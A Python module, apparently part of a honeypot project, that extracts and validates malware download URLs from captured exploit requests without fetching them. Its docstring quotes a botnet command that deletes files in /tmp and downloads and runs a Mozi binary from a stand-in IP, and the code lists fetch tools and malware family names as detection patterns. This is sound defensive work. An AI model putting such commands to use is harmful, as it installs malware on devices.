"""Malware download URLs, read out of the requests the web decoys capture.

A botnet that exploits a router or camera over HTTP almost always sends a shell command
in the same request, and that command fetches the next stage:

    /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://203.0.113.9:43777/Mozi.a;chmod+777+Mozi.a

The address the command downloads from is infrastructure, and it is what the request is
for. This module finds those addresses. It reads text and returns validated URLs. It
never opens a connection, never resolves a name and never fetches what a URL points at:
nothing here, and nothing built on it, downloads malware.

A URL is only returned when it follows a download command (wget, curl, tftp, ftpget,
busybox and the like), is a plain http, https, ftp or tftp address, names a public host,
and fits in 300 characters. Everything else a request contains is ignored. The text is
hostile, so there is no backtracking pattern in here, only splits and comparisons, and
the input is cut to a fixed size first.
"""
from __future__ import annotations

import ipaddress
import re
from dataclasses import dataclass
from urllib.parse import unquote_plus, urlsplit

MAX_TEXT = 8192           # characters of a request looked at
MAX_URLS = 5              # per request
MAX_URL = 300

FETCHERS = {"wget", "curl", "fetch", "lwp-download", "lwp-request", "ftpget", "tftp"}
SCHEMES = {"http": 80, "https": 443, "ftp": 21, "tftp": 69}
SEGMENT = re.compile(r"[;|&\n\r`()<>{}]+|\$\(")
HOSTNAME = re.compile(r"^(?=.{1,253}$)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{2,24}|xn--[a-z0-9-]{2,59})$")
LOCAL_SUFFIXES = (".local", ".lan", ".internal", ".home", ".localdomain", ".corp", ".intranet", ".arpa")
FILE_OK = re.compile(r"[^A-Za-z0-9._-]")

# Whole words in a file name, not substrings, so "sora.mips" is Sora and "assorted" is not.
FAMILIES = {
    "mozi": "Mozi", "mirai": "Mirai", "gafgyt": "Gafgyt", "bashlite": "Gafgyt", "qbot": "Gafgyt",
    "tsunami": "Tsunami", "kaiten": "Tsunami", "xmrig": "Cryptominer", "minerd": "Cryptominer",
    "kinsing": "Kinsing", "kdevtmpfsi": "Kinsing", "sora": "Sora", "okiru": "Okiru",
    "satori": "Satori", "hajime": "Hajime",
}
_WORD = re.compile(r"[a-z]+")


@dataclass(frozen=True)
class Dropper:
    url: str          # canonical: lower-case scheme and host, default port dropped, no credentials
    host: str
    port: int
    scheme: str
    file: str         # the last path segment, made safe
    family: str | None


def decode(path: str, headers: dict[str, str] | None = None, body: bytes = b"") -> str:
    """The text a command could be hiding in: the request target, the header values and
    the start of the body, with percent-encoding and + removed (twice, for the payloads
    that are encoded twice) and the shell's ${IFS} turned back into a space."""
    parts = [path or ""]
    parts += list((headers or {}).values())
    parts.append(body[:2048].decode("utf-8", "replace"))
    text = " ".join(parts)[:MAX_TEXT]
    for _ in range(2):
        text = unquote_plus(text)
    return text.replace("${IFS}", " ").replace("$IFS", " ").replace("{IFS}", " ")[:MAX_TEXT]


def family_hint(name: str) -> str | None:
    for word in _WORD.findall(name.lower()):
        hit = FAMILIES.get(word)
        if hit:
            return hit
    return None


def _host_ok(host: str) -> bool:
    if not host:
        return False
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_global and not (ip.is_multicast or ip.is_reserved or ip.is_unspecified)
    except ValueError:
        pass
    if host.endswith(LOCAL_SUFFIXES) or host == "localhost":
        return False
    return bool(HOSTNAME.match(host))


def clean(raw: str) -> Dropper | None:
    """One candidate URL, validated and put in canonical form, or None."""
    raw = raw.strip().strip("'\"`<>,;.)(")
    if not raw or len(raw) > MAX_URL * 2 or any(ord(c) < 0x21 or ord(c) > 0x7E for c in raw):
        return None
    try:
        parts = urlsplit(raw)
        scheme = parts.scheme.lower()
        host = (parts.hostname or "").lower()
        port = parts.port
    except ValueError:
        return None
    if scheme not in SCHEMES or not _host_ok(host):
        return None
    if port is not None and not 1 <= port <= 65535:
        return None
    port = port or SCHEMES[scheme]
    shown = f"[{host}]" if ":" in host else host
    url = f"{scheme}://{shown}" + ("" if port == SCHEMES[scheme] else f":{port}")
    url += (parts.path or "/") + (f"?{parts.query}" if parts.query else "")
    if len(url) > MAX_URL:
        return None
    name = FILE_OK.sub("", (parts.path or "").rstrip("/").rsplit("/", 1)[-1])[:60]
    return Dropper(url, host, port, scheme, name, family_hint(name))


def _tftp(args: list[str]) -> str | None:
    """tftp -g -r FILE HOST  /  tftp HOST -c get FILE  /  tftp -l LOCAL -r FILE -g HOST."""
    remote = host = None
    i = 0
    while i < len(args):
        a = args[i]
        if a in ("-r", "get", "-c") and i + 1 < len(args):
            nxt = args[i + 1]
            if a == "-c" and nxt == "get" and i + 2 < len(args):
                remote, i = args[i + 2], i + 3
                continue
            if a != "-c":
                remote, i = nxt, i + 2
                continue
        if a in ("-l", "-b", "-p", "-t") and i + 1 < len(args):
            i += 2
            continue
        if not a.startswith("-") and host is None and _host_ok(a.split(":")[0].lower()):
            host = a
        i += 1
    if host and remote and not remote.startswith("-"):
        return f"tftp://{host}/{remote.lstrip('/')}"
    return None


def _ftpget(args: list[str]) -> str | None:
    """ftpget [-v] [-u USER] [-p PASS] [-P PORT] HOST [LOCAL] REMOTE. The user and
    password are not kept."""
    positional, port, i = [], None, 0
    while i < len(args):
        a = args[i]
        if a in ("-u", "-p", "-P") and i + 1 < len(args):
            if a == "-P":
                port = args[i + 1]
            i += 2
            continue
        if not a.startswith("-"):
            positional.append(a)
        i += 1
    if len(positional) >= 2:
        host, remote = positional[0], positional[-1]
        return f"ftp://{host}{':' + port if port and port.isdigit() else ''}/{remote.lstrip('/')}"
    return None


def extract(text: str) -> list[Dropper]:
    """The download URLs in `text`, at most MAX_URLS, in order, without repeats."""
    found: dict[str, Dropper] = {}
    for segment in SEGMENT.split(text[:MAX_TEXT]):
        tokens = segment.split()
        for n, token in enumerate(tokens[:40]):
            # cmd=wget and /usr/bin/wget are both the tool wget
            tool = token.replace("=", "/").replace("?", "/").rsplit("/", 1)[-1].lower()
            if tool not in FETCHERS:
                continue
            rest = tokens[n + 1:n + 30]
            candidates: list[str] = []
            if tool == "tftp":
                built = _tftp(rest)
                if built:
                    candidates.append(built)
            elif tool == "ftpget":
                built = _ftpget(rest)
                if built:
                    candidates.append(built)
            else:
                candidates += [t for t in rest if "://" in t[:12]]
            for cand in candidates:
                d = clean(cand)
                if d and d.url not in found:
                    found[d.url] = d
                    if len(found) >= MAX_URLS:
                        return list(found.values())
    return list(found.values())
